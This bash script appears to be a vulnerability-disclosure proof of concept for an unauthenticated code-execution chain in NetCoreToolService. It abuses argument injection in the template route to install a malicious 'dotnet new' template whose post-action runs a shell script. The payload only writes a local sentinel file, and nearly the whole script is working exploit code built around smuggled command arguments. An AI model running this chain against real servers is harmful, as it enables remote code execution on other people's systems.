#!/usr/bin/env bash
# NCTS-001 — Local, benign PoC for the unauthenticated RCE chain in
# SteeltoeOSS/NetCoreToolService (dotnet new argument injection via the {template}
# route parameter -> ungated `dotnet new install` -> template post-action code exec).
#
# SAFETY: 100% local. Creates a template with a RunScript post-action whose only
# effect is writing a benign SENTINEL file. No network attack, no persistence,
# no destructive payload. Reproduces the EXACT command strings that
# NewController.GetTemplateProject builds from attacker-controlled HTTP input.
#
# Requires: a .NET 10 SDK on PATH (the target's runtime image is dotnet/sdk:10.0-alpine,
# i.e. the full SDK is present in production too).
set -u
export DOTNET_CLI_TELEMETRY_OPTOUT=1 DOTNET_NOLOGO=1 DOTNET_SKIP_FIRST_TIME_EXPERIENCE=1 DOTNET_CLI_UI_LANGUAGE=en

WORK="$(mktemp -d)"
SENTINEL="$WORK/RCE_PROOF.txt"
TMPL="$WORK/EvilTemplate"
mkdir -p "$TMPL/.template.config"

# ---- Attacker's malicious template package contents --------------------------
printf 'content\n' > "$TMPL/content.txt"
cat > "$TMPL/pwn.sh" <<EOF
#!/bin/sh
# Benign marker only. In a real attack this line would be attacker code
# running as the NetCoreToolService process account.
echo "RCE_SENTINEL uid=\$(id -u) user=\$(id -un) host=\$(hostname)" > "$SENTINEL"
EOF
chmod +x "$TMPL/pwn.sh"

cat > "$TMPL/.template.config/template.json" <<'EOF'
{
  "$schema": "http://json.schemastore.org/template",
  "author": "poc", "classifications": ["PoC"],
  "identity": "Evil.RunScript.Template",
  "name": "Evil RunScript Template",
  "shortName": "eviltmpl",
  "sourceName": "content",
  "tags": { "type": "project" },
  "postActions": [{
    "description": "run script",
    "actionId": "3A7C4B45-1F5D-4A30-959A-51B88E82B5D2",
    "continueOnError": false,
    "args": { "executable": "sh", "args": "./pwn.sh" },
    "manualInstructions": [ { "text": "run pwn.sh" } ]
  }]
}
EOF

echo "############################################################"
echo "# Request 1  ->  GET /api/new/install%20$TMPL"
echo "# Controller builds:  dotnet new install <pkg> --output=\"Sample\""
echo "# (NO EnableSensitiveEndpoints check on this path — gate bypassed)"
echo "############################################################"
dotnet new install "$TMPL" --output="Sample" 2>&1 | sed -n '1,20p'
echo

echo "############################################################"
echo "# Request 2  ->  GET /api/new/eviltmpl?options=allow-scripts%3Dyes"
echo "# Controller builds:  dotnet new eviltmpl --output=\"Sample\" --allow-scripts=yes"
echo "############################################################"
PROJ="$WORK/proj"; mkdir -p "$PROJ"
( cd "$PROJ" && dotnet new eviltmpl --output="Sample" --allow-scripts=yes 2>&1 | sed -n '1,20p' )
echo

echo "############################################################"
if [ -f "$SENTINEL" ]; then
  echo "[+] RCE CONFIRMED — post-action executed attacker command:"
  cat "$SENTINEL"
else
  echo "[-] sentinel not created — chain did not fire"
fi
echo "############################################################"

# cleanup installed template so we don't pollute the host template store
dotnet new uninstall "$TMPL" >/dev/null 2>&1
rm -rf "$WORK"
